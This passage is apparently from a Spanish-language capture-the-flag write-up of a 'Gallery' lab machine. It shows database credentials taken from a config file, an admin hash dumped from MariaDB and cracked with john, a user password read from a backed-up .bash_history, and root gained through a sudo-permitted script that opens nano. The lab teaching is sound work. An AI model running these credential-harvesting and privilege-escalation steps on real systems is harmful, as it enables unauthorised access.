+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>!defined<span class="o">(</span><span class="s1">&#39;DB_USERNAME&#39;</span><span class="o">))</span> define<span class="o">(</span><span class="s1">&#39;DB_USERNAME&#39;</span>,<span class="s2">&#34;gallery_user&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>!defined<span class="o">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span><span class="o">))</span> define<span class="o">(</span><span class="s1">&#39;DB_PASSWORD&#39;</span>,<span class="s2">&#34;passw0rd321&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>!defined<span class="o">(</span><span class="s1">&#39;DB_NAME&#39;</span><span class="o">))</span> define<span class="o">(</span><span class="s1">&#39;DB_NAME&#39;</span>,<span class="s2">&#34;gallery_db&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">?&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">www-data@gallery:/var/www/html/gallery$ mysql -h localhost -u gallery_user -p
+</span></span><span class="line"><span class="cl">Enter password: 
+</span></span><span class="line"><span class="cl">Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
+</span></span><span class="line"><span class="cl">Your MariaDB connection id is <span class="m">251</span>
+</span></span><span class="line"><span class="cl">Server version: 10.1.48-MariaDB-0ubuntu0.18.04.1 Ubuntu 18.04
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[(</span>none<span class="o">)]</span>&gt; show databases<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Database           <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> gallery_db         <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> information_schema <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+--------------------+
+</span></span><span class="line"><span class="cl"><span class="m">2</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[(</span>none<span class="o">)]</span>&gt; use gallery_db<span class="p">;</span>
+</span></span><span class="line"><span class="cl">Reading table information <span class="k">for</span> completion of table and column names
+</span></span><span class="line"><span class="cl">You can turn off this feature to get a quicker startup with -A
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Database changed
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>gallery_db<span class="o">]</span>&gt; show tables<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+----------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Tables_in_gallery_db <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> album_list           <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> images               <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> system_info          <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> users                <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----------------------+
+</span></span><span class="line"><span class="cl"><span class="m">4</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>gallery_db<span class="o">]</span>&gt; describe users<span class="p">;</span>
+</span></span><span class="line"><span class="cl">+---------------------------+--------------+------+-----+-------------------+-----------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Field                     <span class="p">|</span> Type         <span class="p">|</span> Null <span class="p">|</span> Key <span class="p">|</span> Default           <span class="p">|</span> Extra                       <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+---------------------------+--------------+------+-----+-------------------+-----------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> id                        <span class="p">|</span> int<span class="o">(</span>50<span class="o">)</span>      <span class="p">|</span> NO   <span class="p">|</span> PRI <span class="p">|</span> NULL              <span class="p">|</span> auto_increment              <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> firstname                 <span class="p">|</span> varchar<span class="o">(</span>250<span class="o">)</span> <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> NULL              <span class="p">|</span>                             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> lastname                  <span class="p">|</span> varchar<span class="o">(</span>250<span class="o">)</span> <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> NULL              <span class="p">|</span>                             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> username                  <span class="p">|</span> text         <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> NULL              <span class="p">|</span>                             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> password                  <span class="p">|</span> text         <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> NULL              <span class="p">|</span>                             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> avatar                    <span class="p">|</span> text         <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> NULL              <span class="p">|</span>                             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> last_login                <span class="p">|</span> datetime     <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> NULL              <span class="p">|</span>                             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="nb">type</span>                      <span class="p">|</span> tinyint<span class="o">(</span>1<span class="o">)</span>   <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> <span class="m">0</span>                 <span class="p">|</span>                             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> date_added                <span class="p">|</span> datetime     <span class="p">|</span> NO   <span class="p">|</span>     <span class="p">|</span> CURRENT_TIMESTAMP <span class="p">|</span>                             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> date_updated              <span class="p">|</span> datetime     <span class="p">|</span> YES  <span class="p">|</span>     <span class="p">|</span> NULL              <span class="p">|</span> on update CURRENT_TIMESTAMP <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+---------------------------+--------------+------+-----+-------------------+-----------------------------+
+</span></span><span class="line"><span class="cl"><span class="m">10</span> rows in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">MariaDB <span class="o">[</span>gallery_db<span class="o">]</span>&gt; Select username,password from users where <span class="nv">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>                                                           
+</span></span><span class="line"><span class="cl">+----------+----------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> username <span class="p">|</span> password                         <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----------+----------------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> admin    <span class="p">|</span> a228b12a08b6527e7978cbe5d914531c <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----------+----------------------------------+
+</span></span><span class="line"><span class="cl"><span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.01 sec<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">john --format<span class="o">=</span>raw-MD5 /usr/share/wordlists/rockyou.txt pass.hash 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">Loaded <span class="m">53</span> password hashes with no different salts <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 256/256 AVX2 8x3<span class="o">])</span>
+</span></span><span class="line"><span class="cl">emerald          <span class="o">(</span>?<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Investigando por el sistema me encontré en la directorio de backups uno que era muy sospechoso. Nos metemos dentro y al ver que contiene vemos que tenemos capacidad de lectura en todos los archivos, por lo que hay uno que podría ser muy curioso ver que hay dentro de él. → <code>.bash_history</code></p>
+<p>Y vemos que hay una contraseña la cuál si la usamos para convertirnos en mike funciona.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@gallery:/home/mike$ <span class="nb">cd</span> /var/backups/
+</span></span><span class="line"><span class="cl">www-data@gallery:/var/backups$ ls
+</span></span><span class="line"><span class="cl">apt.extended_states.0  apt.extended_states.1.gz  apt.extended_states.2.gz  apt.extended_states.3.gz  mike_home_backup
+</span></span><span class="line"><span class="cl">www-data@gallery:/var/backups$ <span class="nb">cd</span> mike_home_backup/
+</span></span><span class="line"><span class="cl">www-data@gallery:/var/backups/mike_home_backup$ ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">36</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">5</span> root root <span class="m">4096</span> May <span class="m">24</span>  <span class="m">2021</span> .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Jan <span class="m">30</span> 17:44 ..
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">135</span> May <span class="m">24</span>  <span class="m">2021</span> .bash_history
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">220</span> May <span class="m">24</span>  <span class="m">2021</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">3772</span> May <span class="m">24</span>  <span class="m">2021</span> .bashrc
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> May <span class="m">24</span>  <span class="m">2021</span> .gnupg
+</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root  <span class="m">807</span> May <span class="m">24</span>  <span class="m">2021</span> .profile
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> May <span class="m">24</span>  <span class="m">2021</span> documents
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> May <span class="m">24</span>  <span class="m">2021</span> images
+</span></span><span class="line"><span class="cl">www-data@gallery:/var/backups/mike_home_backup$ cat .bash_history 
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ~
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">ping 1.1.1.1
+</span></span><span class="line"><span class="cl">cat /home/mike/user.txt
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /var/www/
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> html
+</span></span><span class="line"><span class="cl">ls -al
+</span></span><span class="line"><span class="cl">cat index.html
+</span></span><span class="line"><span class="cl">sudo -lb3stpassw0rdbr0xx -&gt; Esta es la contraseña de mike quitando el -l
+</span></span><span class="line"><span class="cl">clear
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
+</span></span><span class="line"><span class="cl">www-data@gallery:/var/backups/mike_home_backup$ su mike
+</span></span><span class="line"><span class="cl">Password: 
+</span></span><span class="line"><span class="cl">mike@gallery:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">THM<span class="o">{</span>af05cd30bfed67849bexxxxxxx<span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Una vez como mike, probamos a ver que podemos ejecutar como root con → <code>sudo -l</code>, y vemos que podemos ejcutar un script de bash como usuario root sin necesidad de contraseña.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mike@gallery:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> mike on gallery:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User mike may run the following commands on gallery:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/bash /opt/rootkit.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Antes de ejecutarlo vamos a inspeccionar su contenido. Vemos que podemos usar nano como root, lo cual ya es probable que podamos escalar privilegios gracias a <code>nano</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mike@gallery:/opt$ cat rootkit.sh 
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">read</span> -e -p <span class="s2">&#34;Would you like to versioncheck, update, list or read the report ? &#34;</span> ans<span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Execute your choice
+</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="nv">$ans</span> in
+</span></span><span class="line"><span class="cl">    versioncheck<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        /usr/bin/rkhunter --versioncheck <span class="p">;;</span>
+</span></span><span class="line"><span class="cl">    update<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        /usr/bin/rkhunter --update<span class="p">;;</span>
+</span></span><span class="line"><span class="cl">    list<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        /usr/bin/rkhunter --list<span class="p">;;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">read</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">        /bin/nano /root/report.txt<span class="p">;;</span>
+</span></span><span class="line"><span class="cl">    *<span class="o">)</span>
+</span></span><span class="line"><span class="cl">        exit<span class="p">;;</span>
+</span></span><span class="line"><span class="cl"><span class="k">esac</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nos vamos a GTFObins, el cual nos ayudará a saber como escalar privilegios con <code>nano</code> → <a class="link" href="https://gtfobins.github.io/"  target="_blank" rel="noopener"
+    >https://gtfobins.github.io/</a></p>
+<p><img src="/p/writeup-gallery/images/8.PNG"
+	width="855"
+	height="205"
+	srcset="/p/writeup-gallery/images/8_hu506d1dd127c87c728246f2c99368c529_21178_480x0_resize_box_3.PNG 480w, /p/writeup-gallery/images/8_hu506d1dd127c87c728246f2c99368c529_21178_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="417"
+		data-flex-basis="1000px"
+	
+></p>
+<p>Ejecutamos el script y veremos que se nos abre nano.Una vez dentro solamente tendremos que hacer lo que nos dice GTFObins.</p>
+<p><img src="/p/writeup-gallery/images/7.PNG"
+	width="1549"
+	height="325"
+	srcset="/p/writeup-gallery/images/7_hu31fb8bba14fa02252fabd3a92e7bbfe6_72825_480x0_resize_box_3.PNG 480w, /p/writeup-gallery/images/7_hu31fb8bba14fa02252fabd3a92e7bbfe6_72825_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="476"
+		data-flex-basis="1143px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mike@gallery:/opt$ sudo /bin/bash /opt/rootkit.sh 
+</span></span><span class="line"><span class="cl">Would you like to versioncheck, update, list or <span class="nb">read</span> the report ? <span class="nb">read</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/writeup-gallery/images/9.PNG"
+	width="1179"
+	height="293"
+	srcset="/p/writeup-gallery/images/9_hu0a6164d4e559c31ef98f3dbdd014fb29_59099_480x0_resize_box_3.PNG 480w, /p/writeup-gallery/images/9_hu0a6164d4e559c31ef98f3dbdd014fb29_59099_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="402"
+		data-flex-basis="965px"
+	
+></p>
+<p>Y una vez siendo root ya podemos visualizar la flag de ROOT.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Contenidos relacionados</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/writeup-empline/">
+        
+        
+            <div class="article-image">
+                <img src="/p/writeup-empline/logo.af3ad1581671c41b7b890edb5d3676f6_hua65c6c6a95811e4ada5ccd44d600f53a_44605_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post WriteUp Empline"
+                        
+                        data-hash="md5-rzrRWBZxxBt7iQ7bXTZ29g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">WriteUp Empline</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2023 Liv3P0ol
+    </section>
+    
+    <section class="powerby">
+        Creado con <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Tema <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.20.0">Stack</a></b> diseñado por <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
